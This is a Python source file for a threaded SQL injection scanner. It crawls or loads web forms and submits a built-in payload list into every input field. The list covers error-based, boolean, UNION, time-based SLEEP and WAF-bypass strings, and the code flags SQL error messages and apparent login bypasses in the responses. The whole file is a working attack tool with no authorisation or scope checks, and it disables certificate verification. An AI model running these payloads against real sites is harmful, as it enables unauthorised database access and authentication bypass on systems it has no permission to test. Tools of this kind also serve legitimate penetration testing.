import csv
import os
import json
import time
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import requests
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from categories.analysis.methods_analysis import form_analyzer

SQL_PAYLOADS = {
    "error_based": [
        "'",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' AND ''='",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a'--"
    ],
    "boolean_based": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR 1=1--",
        "' OR 1=0--",
        "\" OR 1=1#",
        "' OR '1'='1' --",
        "' OR NOT 1=0--"
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' UNION SELECT 1, 2--",
        "' UNION ALL SELECT NULL, NULL--"
    ],
    "time_based": [
        "' AND (SELECT SLEEP(2))--",
        "\" AND (SELECT SLEEP(2))--",
        "' OR (SELECT SLEEP(2))--"
    ],
    "waf_bypass": [
        "'/**/OR/**/1=1--",
        "' OR '1'='1' /*",
        "'UNION/**/SELECT/**/NULL--",
        "'/*!50000UNION*/ SELECT NULL--",
        "' OR 0x61=0x61--"
    ]
}

ERROR_PATTERNS = [
    r"sql.*error",
    r"mysql.*error", 
    r"ora-\d+",
    r"microsoft.*odbc",
    r"postgresql.*error",
    r"sqlite.*error",
    r"syntax.*error",
    r"unexpected.*token",
    r"unclosed.*quotation",
    r"quoted.*string.*terminated"
]

SUCCESS_PATTERNS = [
    r"welcome.*admin",
    r"dashboard",
    r"logged.*in",
    r"authentication.*successful"
]

def load_urls_from_file(filepath):
    urls = []

    if not os.path.exists(filepath):
        raise FileNotFoundError(f"File not found: {filepath}")

    ext = os.path.splitext(filepath)[-1].lower()

    try:
        if ext == ".json":
            with open(filepath, "r") as f:
                data = json.load(f)
                
                if isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict) and "url" in item:
                            urls.append(item)
                elif isinstance(data, dict):
                    urls = data.get("found_links", [])
                    if not urls:
                        for key in ("urls", "links", "url_list", "forms"):
                            if key in data:
                                urls = data[key] if isinstance(data[key], list) else [data[key]]
                                break

        elif ext == ".csv":
            with open(filepath, "r", newline="") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if "url" in row and row["url"]:
                        urls.append(row)
                    else:
                        for key in ("link", "found_links", "target_url", "website"):
                            if key in row and row[key]:
                                urls.append({"url": row[key]})
                                break
        else:
            raise ValueError("Unsupported file type. Use .json or .csv")

    except json.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON file: {e}")
    except Exception as e:
        raise ValueError(f"Error reading file: {e}")

    unique_urls = []
    seen = set()
    for item in urls:
        if isinstance(item, dict):
            url = item.get("url", "")
        else:
            url = str(item)
        
        if url and url.strip() and url not in seen:
            seen.add(url)
            if isinstance(item, dict):
                unique_urls.append(item)
            else:
                unique_urls.append({"url": url})
    
    return unique_urls

def create_session_with_retries(retries=3, backoff_factor=0.3, timeout=10):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        respect_retry_after_header=True
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    session.headers.update({
        'User-Agent': 'SQLTester/1.0 (Security Testing)',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    })
    
    return session

def analyze_response(response, payload, response_time):
    indicators = []
    confidence = "low"
    
    try:
        response_text = response.text.lower()

        for pattern in ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                indicators.append(f"SQL error detected: {pattern}")
                confidence = "medium"

        for pattern in SUCCESS_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                indicators.append(f"Potential bypass: {pattern}")
                confidence = "high"

        if "SLEEP" in payload.upper() and response_time > 2.5:
            indicators.append("Time delay detected")
            confidence = "high"
        
        if response.status_code == 500:
            indicators.append("Internal server error")
            if confidence == "low":
                confidence = "medium"

        if len(response.text) > 15000:
            indicators.append("Unusually large response")
    
    except Exception:
        pass
    
    return indicators, confidence

def test_single_payload(form, base_url, field_name, payload, category, timeout, session):
    action = form.get("action", "")
    method = form.get("method", "get").lower()
    full_url = urljoin(base_url, action)
    inputs = form.get("inputs", [])

    form_data = {}
    for input_field in inputs:
        input_name = input_field.get("name")
        if not input_name or input_field.get("disabled") or input_field.get("readonly"):
            continue
        
        if input_name == field_name:
            form_data[input_name] = payload
        else:
            input_type = input_field.get("type", "text").lower()
            if input_type == "email":
                form_data[input_name] = "test@example.com"
            elif input_type == "number":
                form_data[input_name] = "123"
            elif input_type == "password":
                form_data[input_name] = "password123"
            else:
                form_data[input_name] = "test"

    try:
        start_time = time.time()
        
        if method == "post":
            response = session.post(full_url, data=form_data, timeout=timeout, verify=False)
        else:
            response = session.get(full_url, params=form_data, timeout=timeout, verify=False)
        
        response_time = time.time() - start_time
        indicators, confidence = analyze_response(response, payload, response_time)

        result = {
            "category": category,
            "target_url": full_url,
            "field": field_name,
            "payload": payload,
            "method": method,
            "status_code": response.status_code,
            "response_time": round(response_time, 3),
            "content_length": len(response.text),
            "vulnerability_indicators": indicators,
            "confidence_level": confidence
        }
        
        return result

    except requests.exceptions.Timeout:
        return {
            "category": category,
            "target_url": full_url,
            "field": field_name,
            "payload": payload,
            "method": method,
            "error": "Request timeout"
        }
    except requests.exceptions.ConnectionError:
        return {
            "category": category,
            "target_url": full_url,
            "field": field_name,
            "payload": payload,
            "method": method,
            "error": "Connection error"
        }
    except Exception as e:
        return {
            "category": category,
            "target_url": full_url,
            "field": field_name,
            "payload": payload,
            "method": method,
            "error": str(e)
        }

def test_sql_injections(form, base_url, timeout=10, session=None, max_workers=3, delay=0.5):
    results = []
    inputs = form.get("inputs", [])

    testable_fields = []
    for field in inputs:
        if (field.get("name") and 
            not field.get("disabled") and 
            not field.get("readonly") and
            field.get("type", "").lower() not in ["submit", "button", "reset", "file", "hidden"]):
            testable_fields.append(field.get("name"))
    
    if not testable_fields:
        return results
   
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        
        for field_name in testable_fields:
            for category, payloads in SQL_PAYLOADS.items():
                for payload in payloads:
                    future = executor.submit(
                        test_single_payload, 
                        form, base_url, field_name, payload, category, timeout, session
                    )
                    futures.append(future)

                    time.sleep(delay)
   
        for future in as_completed(futures):
            try:
                result = future.result()
                results.append(result)
            except Exception:
                pass

    return results

def run(base_url=None, file=None, timeout=10, retries=3, user_agent=None, 
        max_workers=3, delay=0.5, output_file=None):
    
    all_results = []
    session = create_session_with_retries(retries, timeout=timeout)
    
    if user_agent:
        session.headers.update({'User-Agent': user_agent})

    if file:
        try:
            data = load_urls_from_file(file)
            if not data:
                print("[!] No forms found in file.")
                return []

            for item in data:
                if not isinstance(item, dict):
                    continue

                if "url" in item:
                    url = item["url"]
                    form = item
                else:
                    url = base_url
                    form = item
                
                if not url:
                    continue
                
                results = test_sql_injections(
                    form, url, timeout=timeout, session=session, 
                    max_workers=max_workers, delay=delay
                )
                all_results.extend(results)

        except Exception as e:
            print(f"[!] Error loading file: {e}")
            return []

    else:
        if not base_url:
            print("[!] Either base_url or file must be provided.")
            return []
            
        print(f"[+] Scanning forms on: {base_url}")
        try:
            forms = form_analyzer.run(base_url, file, timeout, retries, session=session)
            if not forms:
                print("[!] No forms found on target.")
                return []

            for form in forms:
                results = test_sql_injections(
                    form, base_url, timeout=timeout, session=session,
                    max_workers=max_workers, delay=delay
                )
                all_results.extend(results)

        except Exception as e:
            print(f"[!] Error analyzing forms: {e}")
            return []
    
    return all_results